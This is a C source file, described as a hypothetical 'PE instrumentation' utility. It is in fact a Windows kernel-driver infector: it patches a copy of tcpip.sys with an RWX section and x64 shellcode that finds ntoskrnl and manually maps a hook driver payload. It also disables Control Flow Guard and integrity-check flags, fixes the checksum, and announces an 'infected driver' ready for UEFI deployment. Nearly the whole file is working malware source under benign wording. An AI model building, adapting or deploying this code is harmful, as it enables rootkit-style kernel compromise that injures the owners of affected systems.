#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/**
 * PeModifier.c - A hypothetical utility for PE binary instrumentation in memory.
 */

#define ALIGN_UP(v, a) (((v) + (a) - 1) & ~((a) - 1))

/**
 * Calculates the standard Windows PE Checksum dynamically without 
 * requiring the ImageHlp/DbgHelp library.
 */
DWORD CalculatePeCheckSum(uint8_t* FileBase, size_t FileSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)FileBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(FileBase + pDos->e_lfanew);
    
    // Temporarily zero out the old checksum field during calculation
    pNt->OptionalHeader.CheckSum = 0;
    
    uint64_t checksum = 0;
    uint16_t* ptr = (uint16_t*)FileBase;
    size_t words = FileSize / 2;
    
    for (size_t i = 0; i < words; i++) {
        checksum += ptr[i];
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }
    
    if (FileSize & 1) {
        checksum += FileBase[FileSize - 1];
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }
    
    checksum += (uint64_t)FileSize;
    return (DWORD)checksum;
}

/**
 * Instruments a target PE image by appending a new RWX section and redirecting execution.
 * 
 * @param ImageBase Pointer to the start of the PE image in memory.
 * @param ImageSize The size of the buffer allocated for the image.
 * @param Stub      The diagnostic shellcode to inject.
 * @param StubSize  Size of the stub.
 */
BOOL InstrumentPeImage(uint8_t* ImageBase, size_t ImageSize, const uint8_t* Stub, size_t StubSize) {
    // 1. Parse and validate PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ImageBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(ImageBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    // 2. Save original entry point into OptionalHeader.LoaderFlags
    // We use LoaderFlags as a safe storage location for the stub to retrieve later.
    pNt->OptionalHeader.LoaderFlags = pNt->OptionalHeader.AddressOfEntryPoint;

    // 3. Locate existing sections and prepare for a new header
    PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(pNt);

    // Check if there is enough space in the header for a new section entry
    if ((uint8_t*)&pFirstSection[pNt->FileHeader.NumberOfSections + 1] > (ImageBase + pFirstSection[0].PointerToRawData)) {
        return FALSE; 
    }

    PIMAGE_SECTION_HEADER pLastSection = &pFirstSection[pNt->FileHeader.NumberOfSections - 1];
    PIMAGE_SECTION_HEADER pNewSection = &pFirstSection[pNt->FileHeader.NumberOfSections];

    // 4. Configure the new RWX section
    // We name it .instr and grant it Read, Write, and Execute permissions.
    strncpy((char*)pNewSection->Name, ".instr", IMAGE_SIZEOF_SHORT_NAME);
    pNewSection->Misc.VirtualSize = (DWORD)StubSize;
    
    // Calculate the Virtual Address (RVA) aligned to the SectionAlignment
    DWORD sectionAlignment = pNt->OptionalHeader.SectionAlignment;
    pNewSection->VirtualAddress = ALIGN_UP(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, sectionAlignment);
    
    // Characteristics for RWX (0xE0000020)
    pNewSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    // Calculate file offset for raw data (PointerToRawData)
    pNewSection->SizeOfRawData = ALIGN_UP((DWORD)StubSize, pNt->OptionalHeader.FileAlignment);
    pNewSection->PointerToRawData = ALIGN_UP(pLastSection->PointerToRawData + pLastSection->SizeOfRawData, pNt->OptionalHeader.FileAlignment);

    // 5. Copy the diagnostic byte array (shellcode) into the new section
    if (pNewSection->PointerToRawData + StubSize > ImageSize) {
        return FALSE; // Buffer overflow safety check
    }
    memcpy(ImageBase + pNewSection->PointerToRawData, Stub, StubSize);

    // 6. Update AddressOfEntryPoint to redirect execution to our section
    pNt->OptionalHeader.AddressOfEntryPoint = pNewSection->VirtualAddress;

    // 7. Disable Control Flow Guard (CFG) and Force Integrity
    // If we don't do this, ntoskrnl will BSOD when calling our unverified entry point.
    pNt->OptionalHeader.DllCharacteristics &= ~0x4080; // 0x4000 = CFG, 0x0080 = Force Integrity

    // Zero out the Load Config directory so the OS doesn't try to enforce CFG tables
    pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress = 0;
    pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size = 0;

    // 8. Finalize headers
    pNt->FileHeader.NumberOfSections++;
    pNt->OptionalHeader.SizeOfImage = ALIGN_UP(pNewSection->VirtualAddress + pNewSection->Misc.VirtualSize, sectionAlignment);

    return TRUE;
}

/**
 * Path A: Manual Mapper Assembly Stub (x64)
 * 
 * This stub acts as the position-independent loader. It will:
 * 1. Resolve kernel exports (MmAllocateContiguousMemory, etc.).
 * 2. Manually map the appended .sys file into contiguous memory.
 * 3. Handle base relocations and resolve the IAT.
 * 4. Call the payload's InitializePagingHook.
 * 
 * This shellcode is designed to be Position-Independent (PIC).
 */
const uint8_t LoaderStub[] = {
    // Save original arguments and non-volatile registers
    0x51,                                           // 0: push rcx
    0x52,                                           // 1: push rdx
    0x41, 0x50,                                     // 2: push r8
    0x41, 0x51,                                     // 4: push r9
    0x53,                                           // 6: push rbx
    0x55,                                           // 7: push rbp
    0x48, 0x83, 0xEC, 0x28,                         // 8: sub rsp, 28h

    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,       // 12: lea rax, [rel start] (Offset to patch: 15. Next RIP: 19)
    0x48, 0x89, 0xC5,                               // 19: mov rbp, rax

    // --- 1. Locate ntoskrnl.exe via MSR_LSTAR ---
    0xB9, 0x82, 0x00, 0x00, 0xC0,                   // 22: mov ecx, 0C0000082h
    0x0F, 0x32,                                     // 27: rdmsr
    0x48, 0xC1, 0xE2, 0x20,                         // 29: shl rdx, 20h
    0x48, 0x09, 0xD0,                               // 33: or rax, rdx
    0x48, 0x25, 0x00, 0xF0, 0xFF, 0xFF,             // 36: and rax, 0FFFFFFFFFFFFF000h
    // search_nt_loop:
    0x66, 0x81, 0x38, 0x4D, 0x5A,                   // 42: cmp word ptr [rax], 5A4Dh
    0x74, 0x07,                                     // 47: jz nt_found
    0x48, 0x2D, 0x00, 0x10, 0x00, 0x00,             // 49: sub rax, 1000h
    0xEB, 0xF2,                                     // 55: jmp search_nt_loop
    // nt_found:
    0x48, 0x89, 0xC3,                               // 57: mov rbx, rax (RBX = NtosBase)
    
    // --- 2. Map PagingHook.sys Sections ---
    // Jump to the compiled KernelMapperStub code appended after this stub
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,       // 60: lea rax, [rel ManualMapPayload] (Offset to patch: 63. Next RIP: 67)
    0x48, 0x89, 0xD9,                               // 67: mov rcx, rbx (Arg 1: NtosBase)
    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,       // 70: lea rdx, [rel RawPayload] (Offset to patch: 73. Next RIP: 77)
    0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,       // 77: lea r8, [rel HostBase] (Offset to patch: 80. Next RIP: 84)
    0xFF, 0xD0,                                     // 84: call rax

    // --- 3. Resume Host (tcpip.sys) ---
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,       // 86: lea rax, [rel MZ_Header_Host] (Offset to patch: 89. Next RIP: 93)
    0x8B, 0x48, 0x3C,                               // 93: mov ecx, [rax+3Ch]
    0x8B, 0x8C, 0x08, 0x80, 0x00, 0x00, 0x00,       // 96: mov ecx, [rax+rcx+0x80]
    0x48, 0x01, 0xC8,                               // 103: add rax, rcx (RAX = Original Entry Point VA)
    
    // Restore registers
    0x48, 0x83, 0xC4, 0x28,                         // 106: add rsp, 28h
    0x5D,                                           // 110: pop rbp
    0x5B,                                           // 111: pop rbx
    0x41, 0x59,                                     // 112: pop r9
    0x41, 0x58,                                     // 114: pop r8
    0x5A,                                           // 116: pop rdx
    0x59,                                           // 117: pop rcx
    0xFF, 0xE0                                      // 118: jmp rax
};

int main(void) {
    const char* targetFile = "tcpip_copy.sys"; // Always test on a copy first!
    const char* mapperFile = "mapper.bin";      // Compiled KernelMapperStub.c (PIC)
    const char* payloadFile = "paginghook.sys"; // The standard .sys file to inject
    const char* outputFile = "tcpip_infected.sys";

    // 1. Open files
    FILE* fp = fopen(targetFile, "rb");
    if (!fp) {
        printf("[-] Failed to open %s. Make sure you copied tcpip.sys to this folder.\n", targetFile);
        return 1;
    }

    FILE* mfp = fopen(mapperFile, "rb");
    if (!mfp) {
        printf("[-] Failed to open %s. Compile KernelMapperStub.c as PIC bin first.\n", mapperFile);
        fclose(fp);
        return 1;
    }

    FILE* pfp = fopen(payloadFile, "rb");
    if (!pfp) {
        printf("[-] Failed to open %s. Build paginghook.c first.\n", payloadFile);
        fclose(fp);
        return 1;
    }

    // 2. Get sizes
    fseek(fp, 0, SEEK_END);
    size_t originalSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    fseek(mfp, 0, SEEK_END);
    size_t mapperSize = ftell(mfp);
    fseek(mfp, 0, SEEK_SET);

    fseek(pfp, 0, SEEK_END);
    size_t payloadSize = ftell(pfp);
    fseek(pfp, 0, SEEK_SET);

    // 3. Prepare buffers and read original driver to calculate section RVAs
    size_t combinedStubSize = sizeof(LoaderStub) + mapperSize + payloadSize;
    size_t bufferSize = originalSize + combinedStubSize + 0x1000;
    uint8_t* imageBuffer = (uint8_t*)calloc(1, bufferSize);
    if (!imageBuffer) return 1;

    fread(imageBuffer, 1, originalSize, fp);
    fclose(fp);

    // 4. Patch the LoaderStub logic before injection
    // We need to calculate dynamic RIP-relative offsets for the mapper and payload
    uint8_t* patchedStub = (uint8_t*)malloc(sizeof(LoaderStub));
    if (!patchedStub) return 1;
    memcpy(patchedStub, LoaderStub, sizeof(LoaderStub));

    // Resolve NewSectionRVA to calculate RIP-relative offsets to ImageBase (RVA 0)
    PIMAGE_DOS_HEADER pDosTarget = (PIMAGE_DOS_HEADER)imageBuffer;
    PIMAGE_NT_HEADERS pNtTarget = (PIMAGE_NT_HEADERS)(imageBuffer + pDosTarget->e_lfanew);
    PIMAGE_SECTION_HEADER pSecTarget = IMAGE_FIRST_SECTION(pNtTarget);
    PIMAGE_SECTION_HEADER pLastSecTarget = &pSecTarget[pNtTarget->FileHeader.NumberOfSections - 1];
    DWORD sectionAlignment = pNtTarget->OptionalHeader.SectionAlignment;
    DWORD NewSectionRVA = ALIGN_UP(pLastSecTarget->VirtualAddress + pLastSecTarget->Misc.VirtualSize, sectionAlignment);

    // Offset 12: lea rax, [rel start] (Self-base). Next RIP: 19.
    *(int32_t*)&patchedStub[15] = (int32_t)(0 - 19);

    // Offset 60: lea rax, [rel ManualMapPayload] (start of mapper.bin). Next RIP: 67.
    *(int32_t*)&patchedStub[63] = (int32_t)(sizeof(LoaderStub) - 67);

    // Offset 70: lea rdx, [rel RawPayload] (start of paginghook.sys). Next RIP: 77.
    *(int32_t*)&patchedStub[73] = (int32_t)(sizeof(LoaderStub) + (int32_t)mapperSize - 77);

    // Offset 77: lea r8, [rel HostBase] (RVA 0 of host). Next RIP: 84.
    *(int32_t*)&patchedStub[80] = (int32_t)(0 - (int32_t)(NewSectionRVA + 84));

    // Offset 86: lea rax, [rel MZ_Header_Host] (RVA 0 of host). Next RIP: 93.
    *(int32_t*)&patchedStub[89] = (int32_t)(0 - (int32_t)(NewSectionRVA + 93));

    // Combine: [LoaderStub (ASM)] + [Mapper (PIC C)] + [Payload (.SYS)]
    uint8_t* combinedStub = (uint8_t*)malloc(combinedStubSize);
    if (!combinedStub) return 1;

    // Copy Patched Loader Stub
    memcpy(combinedStub, patchedStub, sizeof(LoaderStub));
    free(patchedStub);

    // Copy PIC Mapper logic immediately after the ASM stub
    fread(combinedStub + sizeof(LoaderStub), 1, mapperSize, mfp);
    
    // Copy the raw .sys file after the mapper
    fread(combinedStub + sizeof(LoaderStub) + mapperSize, 1, payloadSize, pfp);

    fclose(mfp);
    fclose(pfp);

    printf("[*] Parsing PE headers and injecting payload into %s...\n", targetFile);

    // 5. Call the core Elysium instrumentation logic
    if (InstrumentPeImage(imageBuffer, bufferSize, combinedStub, combinedStubSize)) {
        printf("[+] Successfully appended RWX .instr section!\n");
        printf("[+] Original entry point safely hidden in OptionalHeader.LoaderFlags.\n");
        printf("[+] Manual Mapping Loader and %s appended.\n", payloadFile);

        // 5. Write the infected driver back to disk
        FILE* outFp = fopen(outputFile, "wb");
        if (outFp) {
            // Write the original size plus the aligned raw size of the new section (typically 512 byte alignment)
            size_t newFileSize = originalSize + ALIGN_UP((DWORD)combinedStubSize, 512); 

            // Recalculate and update the PE Checksum before saving!
            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imageBuffer;
            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(imageBuffer + pDos->e_lfanew);
            pNt->OptionalHeader.CheckSum = CalculatePeCheckSum(imageBuffer, newFileSize);

            fwrite(imageBuffer, 1, newFileSize, outFp);
            fclose(outFp);
            printf("[+] Infected driver saved as %s. Ready for UEFI deployment!\n", outputFile);
        }
    } else {
        printf("[-] Failed to modify PE headers. Invalid file format or buffer too small.\n");
    }

    free(combinedStub);
    free(imageBuffer);
    return 0;
}